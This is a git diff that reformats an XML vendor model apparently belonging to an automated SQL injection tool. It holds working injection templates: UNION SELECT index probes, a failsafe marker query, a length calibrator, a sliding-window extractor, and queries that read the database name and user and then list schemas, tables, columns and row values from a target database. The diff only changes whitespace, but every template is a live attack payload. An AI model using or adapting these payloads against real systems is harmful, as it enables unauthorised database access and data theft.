@@ -5,87 +5,95 @@
         <info>
 SELECT 
     '-'
-    ||id
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||DATABASE()
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||user()
-    ||'${TRAIL_SQL}'r
+    || id
+    || '${ENCLOSE_VALUE_SQL}'
+    || DATABASE()
+    || '${ENCLOSE_VALUE_SQL}'
+    || user()
+    || '${TRAIL_SQL}'
+    r
 from sysinfo.VERSION
         </info>
         <schema>
             <database>
 select 
     rr
-    ||'${TRAIL_SQL}'r
+    || '${TRAIL_SQL}'
+    r
 from (
     select 
         '${ENCLOSE_VALUE_SQL}'
-        ||trim(t.schemaname)
-        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+        || trim(t.schemaname)
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        rr
     from
-        (select distinct schemaname from SCHEMAS)t,
-        (select distinct schemaname from SCHEMAS)t1
-    where t.schemaname>=t1.schemaname
+        (select distinct schemaname from SCHEMAS) t,
+        (select distinct schemaname from SCHEMAS) t1
+    where t.schemaname >= t1.schemaname
     group by t.schemaname
     {limit}
-)a
+) a
             </database>
             <table>
 select 
     rr
-    ||'${TRAIL_SQL}'r
-from(
+    || '${TRAIL_SQL}'
+    r
+from (
     select 
         '${ENCLOSE_VALUE_SQL}'
-        ||trim(t.tablename)
-        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+        || trim(t.tablename)
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        rr
     from
-        (select distinct tablename from TABLES where SCHEMANAME='${DATABASE}')t,
-        (select distinct tablename from TABLES where SCHEMANAME='${DATABASE}')t1
-    where t.tablename>=t1.tablename
+        (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t,
+        (select distinct tablename from TABLES where SCHEMANAME = '${DATABASE}') t1
+    where t.tablename >= t1.tablename
     group by t.tablename
     {limit}
-)a
+) a
             </table>
             <column>
 select 
     rr
-    ||'${TRAIL_SQL}'r
-from(
+    || '${TRAIL_SQL}'
+    r
+from (
     select 
         '${ENCLOSE_VALUE_SQL}'
-        ||trim(t.COLUMNNAME)
-        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+        || trim(t.COLUMNNAME)
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
     from
-        (select distinct COLUMNNAME from COLUMNS where SCHEMANAME='${DATABASE}'and TABLENAME='${TABLE}')t,
-        (select distinct COLUMNNAME from COLUMNS where SCHEMANAME='${DATABASE}'and TABLENAME='${TABLE}')t1
-    where t.COLUMNNAME>=t1.COLUMNNAME
+        (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t,
+        (select distinct COLUMNNAME from COLUMNS where SCHEMANAME = '${DATABASE}'and TABLENAME = '${TABLE}') t1
+    where t.COLUMNNAME >= t1.COLUMNNAME
     group by t.COLUMNNAME
     {limit}
-)a
+) a
             </column>
             <row>
                 <query>
 select 
     rr
-    ||'${TRAIL_SQL}'r
-from(
+    || '${TRAIL_SQL}'
+    r
+from (
     select 
         '${ENCLOSE_VALUE_SQL}'
-        ||trim(t.s)
-        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'rr
+        || trim(t.s)
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        rr
     from 
-        (select distinct ${FIELDS} s from ${DATABASE}.${TABLE})t,
-        (select distinct ${FIELDS} s from ${DATABASE}.${TABLE})t1
-    where t.s>=t1.s
+        (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t,
+        (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t1
+    where t.s >= t1.s
     group by t.s
     {limit}
-)a
+) a
                 </query>
                 <fields>
-                <field>trim(ifnull(chr(${FIELD}),''))</field>
-                <concat>||'%7f'||</concat>
+                <field>trim(ifnull(chr(${FIELD}), ''))</field>
+                <concat>|| '%7f' ||</concat>
                 </fields>
             </row>
         </schema>
@@ -93,17 +101,33 @@ from(
     <strategy>
         <configuration>
             <slidingWindow>
-select '${LEAD}'||SUBSTR(r,${INDEX},1500)from(${INJECTION})x
+select 
+    '${LEAD}'
+    ||SUBSTR(
+        r,
+        ${INDEX},
+        1500
+    )
+from (
+    ${INJECTION}
+) x
             </slidingWindow>
-            <limit> having count(*) between ${LIMIT} and ${LIMIT}</limit>
-            <failsafe>select(1337${INDICE}7330%2b1)r from dual</failsafe>
-            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}',1025)</calibrator>
+            <limit>having count(*) between ${LIMIT} and ${LIMIT}</limit>
+            <failsafe>select (1337${INDICE}7330%2b1) r from dual</failsafe>
+            <calibrator>
+rpad(
+    '${CALIBRATOR_SQL}', 
+    1024, 
+    '${CALIBRATOR_SQL}', 
+    1025
+)
+            </calibrator>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
-            <indices> union select ${RESULT_RANGE} from(${INDICE_UNIQUE})z</indices>
-            <capacity>(select'${LEAD}${INDICE}'||${CALIBRATOR}from dual)</capacity>
-            <orderBy> order by 1337</orderBy>
+            <indices>union select ${RESULT_RANGE} from (${INDICE_UNIQUE})z</indices>
+            <capacity>(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)</capacity>
+            <orderBy>order by 1337</orderBy>
         </normal>
     </strategy>
 </model>
